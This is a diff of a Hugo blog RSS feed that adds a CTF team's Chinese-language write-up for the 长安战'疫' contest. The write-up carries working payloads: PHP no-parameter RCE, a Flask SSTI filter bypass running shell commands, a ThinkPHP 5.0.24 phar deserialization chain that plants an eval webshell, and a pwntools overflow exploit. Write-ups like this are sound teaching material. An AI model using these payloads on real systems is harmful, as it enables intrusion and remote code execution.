@@ -6,7 +6,1090 @@
         <description>Recent content on or4nge</description>
         <generator>Hugo -- gohugo.io</generator>
         <language>en-us</language>
-        <lastBuildDate>Tue, 28 Dec 2021 16:23:17 +0800</lastBuildDate><atom:link href="https://or4ngesec.github.io/index.xml" rel="self" type="application/rss+xml" /><item>
+        <lastBuildDate>Thu, 13 Jan 2022 13:23:41 +0800</lastBuildDate><atom:link href="https://or4ngesec.github.io/index.xml" rel="self" type="application/rss+xml" /><item>
+        <title>长安战“疫” Writeup</title>
+        <link>https://or4ngesec.github.io/post/cazy-writeup-by-or4nge/</link>
+        <pubDate>Thu, 13 Jan 2022 13:23:41 +0800</pubDate>
+        
+        <guid>https://or4ngesec.github.io/post/cazy-writeup-by-or4nge/</guid>
+        <description>&lt;img src="https://or4ngesec.github.io/post/cazy-writeup-by-or4nge/cover.png" alt="Featured image of post 长安战“疫” Writeup" /&gt;&lt;h2 id=&#34;web&#34;&gt;Web&lt;/h2&gt;
+&lt;h3 id=&#34;rce_no_para&#34;&gt;RCE_No_Para&lt;/h3&gt;
+&lt;p&gt;无参数RCE，且过滤了部分函数。&lt;/p&gt;
+&lt;p&gt;最终payload：&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;?a=cat flag.php;&amp;amp;code=system(current(current(get_defined_vars())));
+&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;flask&#34;&gt;flask&lt;/h3&gt;
+&lt;p&gt;查看网页源码&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;&amp;lt;!--if not request.full_path.endswith(&amp;quot;.js?&amp;quot;):
+	    if not request.full_path.startswith(&amp;quot;/login&amp;quot;):
+	        return redirect(&amp;quot;login&amp;quot;)--&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;要求路径是以&lt;code&gt;/login&lt;/code&gt;开头，以&lt;code&gt;.js?&lt;/code&gt;结尾，&lt;/p&gt;
+&lt;p&gt;查看 &lt;a class=&#34;link&#34; href=&#34;https://flask.palletsprojects.com/en/2.0.x/api/?highlight=request#flask.Request.full_path&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;flask 文档&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;Requested path, including the query string.&lt;/p&gt;
+&lt;p&gt;所以构造路径：&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;/login/../admin?a=.js?
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;然后源码提示：&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;&amp;lt;!--admin/?name=--&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;使用以下路径发现是ssti&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;/login/../admin?name={{7*7}}&amp;amp;a=.js?
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;fuzz发现过滤了&lt;code&gt;__&lt;/code&gt;，&lt;code&gt;builtins&lt;/code&gt;，所以绕，最终payload&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;/login/../admin?name={{config|attr(&#39;_&#39;+&#39;_init_&#39;+&#39;_&#39;)|attr(&#39;_&#39;+&#39;_globals_&#39;+&#39;_&#39;)|attr(&#39;_&#39;+&#39;_getitem_&#39;+&#39;_&#39;)(&#39;_&#39;+&#39;_buil&#39;+&#39;tins_&#39;+&#39;_&#39;)|attr(&#39;_&#39;+&#39;_getitem_&#39;+&#39;_&#39;)(&#39;eval&#39;)(&#39;_&#39;+&#39;_import_&#39;+&#39;_(&amp;quot;os&amp;quot;).popen(&amp;quot;cat /flag&amp;quot;).read()&#39;)}}&amp;amp;a=.js?
+&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;tp&#34;&gt;tp&lt;/h3&gt;
+&lt;p&gt;变量覆盖+phar反序列化+thinkphp 5.0.24反序列化写webshell&lt;/p&gt;
+&lt;p&gt;生成phar文件&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;?&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;php&lt;/span&gt;
+&lt;span style=&#34;color:#66d9ef&#34;&gt;namespace&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;think\process\pipes&lt;/span&gt;;
+&lt;span style=&#34;color:#66d9ef&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;Windows&lt;/span&gt;
+{
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;private&lt;/span&gt; $files &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [];
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt; __construct()
+    {
+        $this&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;files&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [&lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;\think\model\Merge&lt;/span&gt;];
+    }
+}
+ 
+&lt;span style=&#34;color:#66d9ef&#34;&gt;namespace&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;think\model&lt;/span&gt;;
+&lt;span style=&#34;color:#66d9ef&#34;&gt;use&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;think\Model&lt;/span&gt;;
+ 
+&lt;span style=&#34;color:#66d9ef&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;Merge&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;extends&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;Model&lt;/span&gt;
+{
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;protected&lt;/span&gt; $append &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [];
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;protected&lt;/span&gt; $error;
+ 
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt; __construct()
+    {
+        $this&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;append&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [
+            &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;bb&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;getError&amp;#39;&lt;/span&gt;
+        ];
+        $this&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;error&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;\think\model\relation\BelongsTo&lt;/span&gt;);
+    }
+}
+&lt;span style=&#34;color:#66d9ef&#34;&gt;namespace&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;think&lt;/span&gt;;
+&lt;span style=&#34;color:#66d9ef&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;Model&lt;/span&gt;{}
+ 
+&lt;span style=&#34;color:#66d9ef&#34;&gt;namespace&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;think\console&lt;/span&gt;;
+&lt;span style=&#34;color:#66d9ef&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;Output&lt;/span&gt;
+{
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;protected&lt;/span&gt; $styles &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [];
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;private&lt;/span&gt; $handle &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;null&lt;/span&gt;;
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt; __construct()
+    {
+        $this&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;styles&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;removeWhereField&amp;#39;&lt;/span&gt;];
+        $this&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;handle&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;\think\session\driver\Memcache&lt;/span&gt;);
+    }
+}
+ 
+&lt;span style=&#34;color:#66d9ef&#34;&gt;namespace&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;think\model\relation&lt;/span&gt;;
+&lt;span style=&#34;color:#66d9ef&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;BelongsTo&lt;/span&gt;
+{
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;protected&lt;/span&gt; $query;
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt; __construct()
+    {
+        $this&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;query&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;\think\console\Output&lt;/span&gt;);
+    }
+}
+ 
+&lt;span style=&#34;color:#66d9ef&#34;&gt;namespace&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;think\session\driver&lt;/span&gt;;
+&lt;span style=&#34;color:#66d9ef&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;Memcache&lt;/span&gt;
+{
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;protected&lt;/span&gt; $handler &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;null&lt;/span&gt;;
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt; __construct()
+    {
+        $this&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;handler&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;\think\cache\driver\Memcached&lt;/span&gt;);
+    }
+}
+&lt;span style=&#34;color:#66d9ef&#34;&gt;namespace&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;think\cache\driver&lt;/span&gt;;
+&lt;span style=&#34;color:#66d9ef&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;File&lt;/span&gt;
+{
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;protected&lt;/span&gt; $tag;
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;protected&lt;/span&gt; $options &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [];
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt; __construct()
+    {
+        $this&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;tag&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;false&lt;/span&gt;;
+        $this&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;options&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [
+            &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;expire&amp;#39;&lt;/span&gt;        &lt;span style=&#34;color:#f92672&#34;&gt;=&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3600&lt;/span&gt;,
+            &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;cache_subdir&amp;#39;&lt;/span&gt;  &lt;span style=&#34;color:#f92672&#34;&gt;=&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;false&lt;/span&gt;,
+            &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;prefix&amp;#39;&lt;/span&gt;        &lt;span style=&#34;color:#f92672&#34;&gt;=&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;,
+            &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;data_compress&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;false&lt;/span&gt;,
+            &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;path&amp;#39;&lt;/span&gt;          &lt;span style=&#34;color:#f92672&#34;&gt;=&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;php://filter/convert.base64-decode/resource=/var/www/html/public/&amp;#39;&lt;/span&gt;,
+        ];
+    }
+}
+ 
+&lt;span style=&#34;color:#66d9ef&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;Memcached&lt;/span&gt;
+{
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;protected&lt;/span&gt; $tag;
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;protected&lt;/span&gt; $options &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [];
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;protected&lt;/span&gt; $handler &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;null&lt;/span&gt;;
+ 
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt; __construct()
+    {
+        $this&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;tag&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;true&lt;/span&gt;;
+        $this&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;options&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [
+            &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;expire&amp;#39;&lt;/span&gt;   &lt;span style=&#34;color:#f92672&#34;&gt;=&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;,
+            &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;prefix&amp;#39;&lt;/span&gt;   &lt;span style=&#34;color:#f92672&#34;&gt;=&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;PD9waHAKZXZhbCgkX0dFVFsnYSddKTsKPz4&amp;#39;&lt;/span&gt;,
+        ];
+        $this&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;handler&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;File&lt;/span&gt;);
+    }
+}
+$obj &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;\think\process\pipes\Windows&lt;/span&gt;();
+&lt;span style=&#34;color:#f92672&#34;&gt;@&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;unlink&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;or4nge.phar&amp;#34;&lt;/span&gt;);
+$phar &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;\Phar&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;or4nge.phar&amp;#34;&lt;/span&gt;); &lt;span style=&#34;color:#75715e&#34;&gt;//后缀名必须为phar
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;$phar&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;startBuffering&lt;/span&gt;();
+$phar&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;setStub&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;lt;?php __HALT_COMPILER(); ?&amp;gt;&amp;#34;&lt;/span&gt;); &lt;span style=&#34;color:#75715e&#34;&gt;//设置stub
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;$phar&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;setMetadata&lt;/span&gt;($obj); &lt;span style=&#34;color:#75715e&#34;&gt;//将自定义的meta-data存入manifest
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;$phar&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;addFromString&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;test.txt&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;test&amp;#34;&lt;/span&gt;); &lt;span style=&#34;color:#75715e&#34;&gt;//添加要压缩的文件
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;//签名自动计算
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;$phar&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;stopBuffering&lt;/span&gt;();
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;变量覆盖，触发反序列化&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; requests
+url &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;http://9316a714.lxctf.net/public/index.php/index/Index/upload&amp;#39;&lt;/span&gt;
+
+files &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; {&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;file&amp;#39;&lt;/span&gt;: (&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;or4nge&amp;#39;&lt;/span&gt;, open(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;or4nge.phar&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;rb&amp;#39;&lt;/span&gt;))}
+r &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; requests&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;post(url, files&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;files)
+r &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; requests&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;post(url, params&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;FILES[file][tmp_name]=or4nge.jpg&amp;amp;FILES[file][name]=phar://or4nge&amp;#34;&lt;/span&gt;)
+print(r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;text)
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;会在 &lt;code&gt;/var/www/html/public&lt;/code&gt; 下生成 &lt;code&gt;8fba8bb6410a4aee90b063a8b7e78b73.php&lt;/code&gt;，文件内容包含 &lt;code&gt;&amp;lt;?php eval($_GET[&#39;a&#39;]);&lt;/code&gt; 直接用就可以了。&lt;/p&gt;
+&lt;h2 id=&#34;pwn&#34;&gt;Pwn&lt;/h2&gt;
+&lt;h3 id=&#34;pwn1&#34;&gt;pwn1&lt;/h3&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; pwn &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;
+&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; sys
+context&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;log_level &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;debug&amp;#34;&lt;/span&gt;
+
+&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; len(sys&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;argv) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;:
+    debug &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;True&lt;/span&gt;
+&lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;:
+    debug &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;False&lt;/span&gt;
+
+&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; debug:
+    p &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; process(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;./pwn1&amp;#34;&lt;/span&gt;)
+
+&lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;:
+    p &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; remote(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;113.201.14.253&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;16088&lt;/span&gt;)
+
+ru &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;lambda&lt;/span&gt; x : p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recvuntil(x)
+sn &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;lambda&lt;/span&gt; x : p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;send(x)
+rl &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;lambda&lt;/span&gt; : p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recvline()
+sl &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;lambda&lt;/span&gt; x : p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendline(x)
+rv &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;lambda&lt;/span&gt; x : p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recv(x)
+sa &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;lambda&lt;/span&gt; a,b : p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendafter(a,b)
+sla &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;lambda&lt;/span&gt; a,b : p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendlineafter(a, b)
+
+&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;debugf&lt;/span&gt;(b&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;):
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; debug:
+        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; b:
+            gdb&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;attach(p,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;b *&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{b}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;format(b &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; hex(b)))
+        &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;:
+            gdb&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;attach(p)
+
+debugf(&lt;span style=&#34;color:#ae81ff&#34;&gt;0x08048596&lt;/span&gt;)
+
+ru(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Gift:&amp;#39;&lt;/span&gt;)
+buf &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; int(ru(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;)[:&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;],&lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;)
+pay &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; p32(&lt;span style=&#34;color:#ae81ff&#34;&gt;0x8048540&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;a&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;48&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; p32(buf&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;)
+sn(pay)
+&lt;span style=&#34;color:#75715e&#34;&gt;#flag{474b7f9219effe69530da4ad63c1752a}&lt;/span&gt;
+p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;interactive()
